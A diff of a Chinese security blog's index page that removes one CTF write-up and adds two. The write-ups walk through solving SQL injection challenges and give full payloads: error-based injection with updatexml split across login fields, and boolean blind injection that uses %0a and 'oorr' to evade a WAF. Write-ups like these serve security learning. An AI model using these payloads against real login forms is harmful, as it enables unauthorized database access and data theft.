@@ -281,200 +281,6 @@
   
   
   <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/08/29/CTF题目-加了料的报错注入/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="name" content="Chen DY">
-      <meta itemprop="description" content>
-      <meta itemprop="image" content="/images/avatar.jpg">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Chen's Bolg">
-    </span>
-
-    
-      <header class="post-header">
-
-        
-        
-          <h1 class="post-title" itemprop="name headline">
-                
-                <a class="post-title-link" href="/2019/08/29/CTF题目-加了料的报错注入/" itemprop="url">CTF题目-加了料的报错注入</a></h1>
-        
-
-        <div class="post-meta">
-          <span class="post-time">
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">发表于</span>
-              
-              <time title="创建于" itemprop="dateCreated datePublished" datetime="2019-08-29T16:03:21+08:00">
-                2019-08-29
-              </time>
-            
-
-            
-
-            
-          </span>
-
-          
-            <span class="post-category">
-            
-              <span class="post-meta-divider">|</span>
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-folder-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">分类于</span>
-              
-              
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/安全/" itemprop="url" rel="index">
-                    <span itemprop="name">安全</span>
-                  </a>
-                </span>
-
-                
-                
-              
-            </span>
-          
-
-          
-            
-          
-
-          
-          
-
-          
-
-          
-            <div class="post-wordcount">
-              
-                
-                <span class="post-meta-item-icon">
-                  <i class="fa fa-file-word-o"></i>
-                </span>
-                
-                  <span class="post-meta-item-text">字数统计&#58;</span>
-                
-                <span title="字数统计">
-                  698字
-                </span>
-              
-
-              
-                <span class="post-meta-divider">|</span>
-              
-
-              
-                <span class="post-meta-item-icon">
-                  <i class="fa fa-clock-o"></i>
-                </span>
-                
-                  <span class="post-meta-item-text">阅读时长 &asymp;</span>
-                
-                <span title="阅读时长">
-                  2分钟
-                </span>
-              
-            </div>
-          
-
-          
-
-        </div>
-      </header>
-    
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-      
-
-      
-        
-          
-            <p>题目地址：<a href="http://www.shiyanbar.com/ctf/2011" target="_blank" rel="noopener">http://www.shiyanbar.com/ctf/2011</a></p>
-<h2 id="尝试"><a href="#尝试" class="headerlink" title="尝试"></a>尝试</h2><p>首先看题目，题目很明显给出了提示，本题是使用报错注入来解决的。</p>
-<p>进入网页解题，源码部分给出了查询数据库的命令，为<br><code>$sql=&quot;select * from users where username=&#39;$username&#39; and password=&#39;$password&#39;&quot;;</code></p>
-<p>同时题目是通过POST的方式来传输账号和密码的，首先在POST报文中尝试提供信息为<code>username=1+&amp;+password=1</code>，发送后网页端返回<code>Login failed</code></p>
-<p>尝试使用<code>username=&#39; or 1=1 %23&amp;password=1</code>进行注入，网页端反馈Sql injection detected，因此可以推断出服务器端对SQL的注入命令进行了筛选，也就是加了WAF</p>
-<h2 id="测试"><a href="#测试" class="headerlink" title="测试"></a>测试</h2><p>使用BURP抓取POST包进行fuzz分析，分别对username和password的内容进行测试，测试发现两者屏蔽的值并不相同</p>
-<p>首先对于username，分析结果如下图所示：</p>
-<img src="/2019/08/29/CTF题目-加了料的报错注入/2.png">
-
-<p>由返回长度可以知道信息，其中302是<code>Login failed</code>，238是<code>Sql injection detected</code>，235是<code>username unknow error</code>对于后两者相当于符号被屏蔽了，前者是可以使用的。因此可以看出在username字段不能使用#、-、=、(、)，但是最终要的是这里能用到exp和updatexml</p>
-<p>对于password，分析结果如下：</p>
-<img src="/2019/08/29/CTF题目-加了料的报错注入/1.png">
-
-<p>和前面相反，这里并没屏蔽()，因此可以选择在后面添加语句</p>
-<p>构造语句<code>username=&#39; or exp/*&amp;password=*/(~(select * from (select user()) a)) or &#39;</code>发现返回的语句并没有解析user()，而是原样报错返回了</p>
-<p>尝试使用updatexml构造语句<code>username=&#39; or updatexml/*&amp;password=*/(1,concat(0x3a,(select user())),1) or &#39;</code>，可以发现网页返回了用户名<code>web8@localhost</code></p>
-<h2 id="破解"><a href="#破解" class="headerlink" title="破解"></a>破解</h2><p>得到payload就可以开始注入了，首先构造一句话来得到表名字：<br><code>username=&#39; or updatexml/*&amp;password=*/(1,concat(0x3a,(select group_concat(table_name) from information_schema.tables where table_schema=database())),1) or &#39;</code><br>结果发现出现了数据库注入报错，仔细观察发现是在password的内容端添加了一个等号，而前面测试过，等号是被屏蔽的，这时候可以想到使用正则表达式的指令regexp来代替等号，因此构造语句为：<br><code>username=&#39; or updatexml/*&amp;password=*/(1,concat(0x3a,(select group_concat(table_name) from information_schema.tables where table_schema regexp database())),1) or &#39;</code></p>
-<p>网页返回结果为<code>XPATH syntax error: &#39;:ffll44jj,users&#39;</code><br>因此成功得到表名为<code>ffll44jj</code></p>
-<p>接下来尝试获取字段名，同样的方法，构造语句：<br><code>username=&#39; or updatexml/*&amp;password=*/(1,concat(0x3a,(select group_concat(column_name) from information_schema.columns where table_name regexp &#39;ffll44jj&#39;)),1) or &#39;</code></p>
-<p>网页成功返回<code>XPATH syntax error: &#39;:value&#39;</code><br>由此得知flag所在列的名称为value</p>
-<p>再次构造命令来获取列中的值：<br><code>username=&#39; or updatexml/*&amp;password=*/(1,concat(0x3a,(select value from ffll44jj)),1) or &#39;</code></p>
-<p>然后就可以成功得到flag为<code>XPATH syntax error: &#39;:flag{err0r_b4sed_sqli_+_hpf}&#39;</code></p>
-
-          
-        
-      
-    </div>
-    
-    
-    
-
-    
-
-    
-
-    
-
-    <footer class="post-footer">
-      
-
-      
-
-      
-
-      
-      
-        <div class="post-eof"></div>
-      
-    </footer>
-  </div>
-  
-  
-  
-  </article>
-
-
-    
-      
-
-  
-
-  
-  
-  
-
-  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
-  
-  
-  
-  <div class="post-block">
     <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/08/29/文件上传的简单介绍/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
@@ -1059,6 +865,405 @@
 <img src="/2019/07/05/SQLMAP的使用/8.png">
 
 <h2 id="sqlmap-dns查询"><a href="#sqlmap-dns查询" class="headerlink" title="sqlmap dns查询"></a>sqlmap dns查询</h2><p>利用sqlmap dns后缀来进行DNS查询，后缀为<code>--dns-domain</code></p>
+
+          
+        
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/07/05/CTF题目-认真一点/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="Chen DY">
+      <meta itemprop="description" content>
+      <meta itemprop="image" content="/images/avatar.jpg">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Chen's Bolg">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+                
+                <a class="post-title-link" href="/2019/07/05/CTF题目-认真一点/" itemprop="url">CTF题目-认真一点</a></h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2019-07-05T16:11:39+08:00">
+                2019-07-05
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category">
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/安全/" itemprop="url" rel="index">
+                    <span itemprop="name">安全</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+            <div class="post-wordcount">
+              
+                
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-file-word-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">字数统计&#58;</span>
+                
+                <span title="字数统计">
+                  741字
+                </span>
+              
+
+              
+                <span class="post-meta-divider">|</span>
+              
+
+              
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-clock-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">阅读时长 &asymp;</span>
+                
+                <span title="阅读时长">
+                  3分钟
+                </span>
+              
+            </div>
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <p>题目地址：<a href="http://www.shiyanbar.com/ctf/2009" target="_blank" rel="noopener">http://www.shiyanbar.com/ctf/2009</a></p>
+<p>拿到题目，先尝试分析，在框内输入1，网页显示<code>you are in...</code><br>接着在框内输入0，网页显示<code>you are not in...</code></p>
+<p>接着尝试输入<code>0&#39; or &#39;1&#39;=&#39;1</code>，网页反馈信息<code>Sql injection detected!</code>，由此可以知道该数据库存在WAF保护，通过burp跑fuzz测试，如下图所示：</p>
+<img src="/2019/07/05/CTF题目-认真一点/1.png">
+
+<p>可知可以用的符号是<code>or,=,(,),&#39;,&quot;</code><br>被屏蔽的符号为<code>and,,,substring,union,#,|</code>另外空格添加在字符中间也会被屏蔽</p>
+<p>因此可以看出本体的解题思路是使用布尔盲注。。</p>
+<p>我们首先用%0a代替空格进行注入，命令为<code>id=1&#39;%0aor%0a&#39;1&#39;=&#39;1</code>，结果为<code>you are not in...</code><br>这说明用%0a代替空格的方案是正确的，但是可能or在处理中被删除了，因此用oorr来代替or进行注入，结果显示成功，由此开始布尔注入的过程。</p>
+<p>接下来的过程中，我们用oorr替换or，并且把空格替换成%0a</p>
+<h2 id="获取数据库名称长度和数据库名称"><a href="#获取数据库名称长度和数据库名称" class="headerlink" title="获取数据库名称长度和数据库名称"></a>获取数据库名称长度和数据库名称</h2><p>构造payload获取名称长度：<br><code>0&#39; or (length(database())=%s) or&#39;0</code></p>
+<p>构造获取名称的payload:<br><code>0&#39; or (mid(database() from %s for 1))=&#39;%s&#39; or &#39;0</code></p>
+<p>爆破的结果如下图所示：</p>
+<img src="/2019/07/05/CTF题目-认真一点/2.png">
+
+<p>可知获取到的数据库名称为<code>ctf_sql_bool_blind</code></p>
+<h2 id="获取表名的长度和名称"><a href="#获取表名的长度和名称" class="headerlink" title="获取表名的长度和名称"></a>获取表名的长度和名称</h2><p>构造payload获取长度：<br><code>0&#39; or (length((select group_concat(table_name separator &#39;@&#39;) from information_schema.TABLES where TABLE_SCHEMA=database()))=%s) or&#39;0</code></p>
+<p>获取名称的payload为：<br><code>0&#39; or (mid((select group_concat(table_name separator &#39;@&#39;) from information_schema.TABLES where TABLE_SCHEMA=database())from %s for 1)=&#39;%s&#39;)or &#39;0</code></p>
+<p>爆破结果如下：</p>
+<img src="/2019/07/05/CTF题目-认真一点/3.png">
+
+<p>由上图可知，该数据库下由两张表，分别是fiag和users，因为在最开始没有在group_concat里面加separator ‘@’，所以两个名称都连在一起了，原因是默认的分隔符不知道是什么，所以程序就跳过了分隔符。</p>
+<h2 id="获取字段名称长度和名称"><a href="#获取字段名称长度和名称" class="headerlink" title="获取字段名称长度和名称"></a>获取字段名称长度和名称</h2><p>构造获取长度的payload:<br><code>0&#39; or (length((select group_concat(column_name) from information_schema.columns where TABLE_name=&#39;%s&#39;))=%s) or&#39;0</code></p>
+<p>获取内容的payload:<br><code>0&#39; or (mid((select group_concat(column_name) from information_schema.columns where TABLE_name=&#39;%s&#39;)from %s for 1)=&#39;%s&#39;)or &#39;0</code></p>
+<p>爆破结果如下：</p>
+<img src="/2019/07/05/CTF题目-认真一点/4.png">
+
+<h2 id="获取flag的长度和内容"><a href="#获取flag的长度和内容" class="headerlink" title="获取flag的长度和内容"></a>获取flag的长度和内容</h2><p>获取长度的payload:<br><code>0&#39; or (length((select %s from %s))=%s) or&#39;0</code></p>
+<p>获取内容的payload:<br><code>0&#39; or (mid((select %s from %s)from %s for 1)=&#39;%s&#39;)or &#39;0</code></p>
+<p>爆破结果如下：</p>
+<img src="/2019/07/05/CTF题目-认真一点/5.png">
+
+<p>这里多加了两位长度，因为在提交的时候发现爆破出来的flag一直报错，多加了两位后发现后面无论多少位<code>-</code>都能匹配上，因此认定中间的<code>-</code>可能是另外的符号转化的。</p>
+<p>通过使用ascii()函数来确定该字符的确切ascii码，发现该字符是空格，因为空格已经被屏蔽了，所以用等号来确定是无法确定的。</p>
+
+          
+        
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/07/04/CTF题目-加了料的报错注入/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="Chen DY">
+      <meta itemprop="description" content>
+      <meta itemprop="image" content="/images/avatar.jpg">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Chen's Bolg">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+                
+                <a class="post-title-link" href="/2019/07/04/CTF题目-加了料的报错注入/" itemprop="url">CTF题目-加了料的报错注入</a></h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2019-07-04T16:03:21+08:00">
+                2019-07-04
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category">
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/安全/" itemprop="url" rel="index">
+                    <span itemprop="name">安全</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+            <div class="post-wordcount">
+              
+                
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-file-word-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">字数统计&#58;</span>
+                
+                <span title="字数统计">
+                  698字
+                </span>
+              
+
+              
+                <span class="post-meta-divider">|</span>
+              
+
+              
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-clock-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">阅读时长 &asymp;</span>
+                
+                <span title="阅读时长">
+                  2分钟
+                </span>
+              
+            </div>
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <p>题目地址：<a href="http://www.shiyanbar.com/ctf/2011" target="_blank" rel="noopener">http://www.shiyanbar.com/ctf/2011</a></p>
+<h2 id="尝试"><a href="#尝试" class="headerlink" title="尝试"></a>尝试</h2><p>首先看题目，题目很明显给出了提示，本题是使用报错注入来解决的。</p>
+<p>进入网页解题，源码部分给出了查询数据库的命令，为<br><code>$sql=&quot;select * from users where username=&#39;$username&#39; and password=&#39;$password&#39;&quot;;</code></p>
+<p>同时题目是通过POST的方式来传输账号和密码的，首先在POST报文中尝试提供信息为<code>username=1+&amp;+password=1</code>，发送后网页端返回<code>Login failed</code></p>
+<p>尝试使用<code>username=&#39; or 1=1 %23&amp;password=1</code>进行注入，网页端反馈Sql injection detected，因此可以推断出服务器端对SQL的注入命令进行了筛选，也就是加了WAF</p>
+<h2 id="测试"><a href="#测试" class="headerlink" title="测试"></a>测试</h2><p>使用BURP抓取POST包进行fuzz分析，分别对username和password的内容进行测试，测试发现两者屏蔽的值并不相同</p>
+<p>首先对于username，分析结果如下图所示：</p>
+<img src="/2019/07/04/CTF题目-加了料的报错注入/2.png">
+
+<p>由返回长度可以知道信息，其中302是<code>Login failed</code>，238是<code>Sql injection detected</code>，235是<code>username unknow error</code>对于后两者相当于符号被屏蔽了，前者是可以使用的。因此可以看出在username字段不能使用#、-、=、(、)，但是最终要的是这里能用到exp和updatexml</p>
+<p>对于password，分析结果如下：</p>
+<img src="/2019/07/04/CTF题目-加了料的报错注入/1.png">
+
+<p>和前面相反，这里并没屏蔽()，因此可以选择在后面添加语句</p>
+<p>构造语句<code>username=&#39; or exp/*&amp;password=*/(~(select * from (select user()) a)) or &#39;</code>发现返回的语句并没有解析user()，而是原样报错返回了</p>
+<p>尝试使用updatexml构造语句<code>username=&#39; or updatexml/*&amp;password=*/(1,concat(0x3a,(select user())),1) or &#39;</code>，可以发现网页返回了用户名<code>web8@localhost</code></p>
+<h2 id="破解"><a href="#破解" class="headerlink" title="破解"></a>破解</h2><p>得到payload就可以开始注入了，首先构造一句话来得到表名字：<br><code>username=&#39; or updatexml/*&amp;password=*/(1,concat(0x3a,(select group_concat(table_name) from information_schema.tables where table_schema=database())),1) or &#39;</code><br>结果发现出现了数据库注入报错，仔细观察发现是在password的内容端添加了一个等号，而前面测试过，等号是被屏蔽的，这时候可以想到使用正则表达式的指令regexp来代替等号，因此构造语句为：<br><code>username=&#39; or updatexml/*&amp;password=*/(1,concat(0x3a,(select group_concat(table_name) from information_schema.tables where table_schema regexp database())),1) or &#39;</code></p>
+<p>网页返回结果为<code>XPATH syntax error: &#39;:ffll44jj,users&#39;</code><br>因此成功得到表名为<code>ffll44jj</code></p>
+<p>接下来尝试获取字段名，同样的方法，构造语句：<br><code>username=&#39; or updatexml/*&amp;password=*/(1,concat(0x3a,(select group_concat(column_name) from information_schema.columns where table_name regexp &#39;ffll44jj&#39;)),1) or &#39;</code></p>
+<p>网页成功返回<code>XPATH syntax error: &#39;:value&#39;</code><br>由此得知flag所在列的名称为value</p>
+<p>再次构造命令来获取列中的值：<br><code>username=&#39; or updatexml/*&amp;password=*/(1,concat(0x3a,(select value from ffll44jj)),1) or &#39;</code></p>
+<p>然后就可以成功得到flag为<code>XPATH syntax error: &#39;:flag{err0r_b4sed_sqli_+_hpf}&#39;</code></p>
 
           
         
@@ -2008,7 +2213,7 @@
               
                 <a href="/archives/">
               
-                  <span class="site-state-item-count">8</span>
+                  <span class="site-state-item-count">9</span>
                   <span class="site-state-item-name">日志</span>
                 </a>
               </div>
@@ -2081,7 +2286,7 @@
     
       <span class="post-meta-item-text">Site words total count&#58;</span>
     
-    <span title="Site words total count">11.3k</span>
+    <span title="Site words total count">12k</span>
   
 </div>
 
